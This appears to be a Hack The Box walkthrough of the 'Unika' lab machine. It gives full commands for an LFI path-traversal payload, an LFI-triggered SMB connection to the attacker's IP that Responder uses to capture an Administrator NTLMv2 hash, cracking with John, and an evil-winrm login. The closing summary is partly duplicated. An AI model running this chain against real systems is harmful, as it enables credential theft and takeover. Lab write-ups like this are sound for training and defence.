# 🏴‍☠️ HTB Walkthrough: Unika — Full Pwn via LFI to Responder SMB NTLMv2 Hash Capture and Evil-WinRM!

Welcome to the glorious **Unika** machine takedown! In this walkthrough, we go from **initial reconnaissance** to **full-blown SYSTEM access** using clever abuse of a **Local File Inclusion (LFI)** vulnerability to trigger **SMB-based NTLMv2 hash capture** and then **crack it open like a coconut** to gain Administrator access via **Evil-WinRM**.

---

## 🔍 STEP 1 — Initial Nmap Recon: Discover the Attack Surface

We started with a standard port scan to see what services are exposed on the target.


🎯 We see that:
- **Port 80** is open → hosting a web server (likely vulnerable).
- **Port 5985** is open → this is Windows Remote Management (used by Evil-WinRM for lateral movement).

## 🌐 STEP 2 — Manual Web Browsing & Local File Inclusion (LFI) Discovery

Visited the site in a browser: `http://unika.htb/`

We tested for LFI vulnerability by manually fuzzing the `page` parameter:

```http
http://unika.htb/index.php?page=../../../../../../../../../../../../windows/system32/drivers/etc/hosts
```

🧠 And... **Boom!** The server responded with the contents of the `hosts` file — we have **LFI!**

This means the server is directly including files based on user-supplied input without sanitization.

## 🪝 STEP 3 — Set Up Responder to Catch the Hash

We now attempt to force the Windows machine to **authenticate to us** by tricking it into loading a remote SMB path — a classic LFI-to-SMB attack.

To do that, we first set up **Responder** to listen for inbound SMB connections and capture NTLMv2 hashes:

```bash
responder -I tun0
```

> `-I tun0` specifies the network interface we're listening on (your VPN interface).

## 🎣 STEP 4 — Trigger the LFI to Send SMB Auth Request to Us

Now we use the LFI to **point the `page` parameter** to our attack box (simulating a file read from an SMB path):

```http
http://unika.htb/index.php?page=//10.10.14.123/something
```

📡 The double forward slashes (`//`) trigger a remote file inclusion over SMB.

**Responder Output:**
```
[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:31d0c9ef14ecdfa3:...
```

💥 We now have the **NTLMv2 hash of the `Administrator` user** — the golden ticket!

## 📥 STEP 5 — Save the Captured Hash for Cracking

We take that massive captured NTLMv2 hash blob and store it in a text file called `hash.txt`:

```bash
echo "Administrator::RESPONDER:31d0c9ef14ecdfa3:84CAACDE4EDCBFFF575B4CC9984B3AEA:010100000000000000DCD3E54FECDB013EC34A1B2F4192350000000002000800530052003300310001001E00570049004E002D0034005700480045004E004600540042004A005500330004003400570049004E002D0034005700480045004E004600540042004A00550033002E0053005200330031002E004C004F00430041004C000300140053005200330031002E004C004F00430041004C000500140053005200330031002E004C004F00430041004C000700080000DCD3E54FECDB01060004000200000008003000300000000000000001000000002000000486763F93F8E248DA93D39CD803C7D6FF0B38D113F400253279E74DDBDDACDD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320033000000000000000000" > hash.txt
```

## 🔓 STEP 6 — Crack the Hash with John the Ripper and RockYou

We use John the Ripper with the legendary `rockyou.txt` wordlist to try cracking the password:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
```

🎉 The password is: **`badminton`**

## 💀 STEP 7 — Pwn the Box with Evil-WinRM

Armed with `administrator:badminton`, we connect to the WinRM port and gain **a full interactive PowerShell shell**:

```bash
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

**We are in as Administrator** — it's over for Unika. Let’s extract the loot!

## 🏁 STEP 8 — Grab the Flag

```powershell
cd C:\Users\mike\desktop
dir
```

**Output:**
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt
```

📁 Found: `flag.txt` on the Desktop of the `mike` user.

## ✅ Summary of Commands

```bash
nmap 10.129.95.234

responder -I tun0

# In browser or curl:
http://unika.htb/index.php?page=//10.10.14.123/something

# Save hash
echo "<HASH>" > hash.txt

# Crack with rockyou
john -w=/usr/share/wordlists/rockyou.txt hash.txt

# Pwn with Evil-WinRM
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

## 💡 Final Notes

This attack showcases a brutally effective LFI → SMB hash capture → NTLM cracking → WinRM pwn chain.  
The success relied on:
- Insecure file inclusion (LFI)
- No outbound SMB restrictions
- Weak password crackable with rockyou
- WinRM enabled for lateral access

📌 Harden all these layers to prevent total system compromise in a real-world network.

# Save hash
echo "<HASH>" > hash.txt

# Crack with rockyou
john -w=/usr/share/wordlists/rockyou.txt hash.txt

# Pwn with Evil-WinRM
evil-winrm -i 10.129.95.234 -u administrator -p badminton
💡 Final Notes
This attack showcases a brutally effective LFI → SMB hash capture → NTLM cracking → WinRM pwn chain.

The success relies heavily on misconfigured SMB auth, weak password, and exposed WinRM.
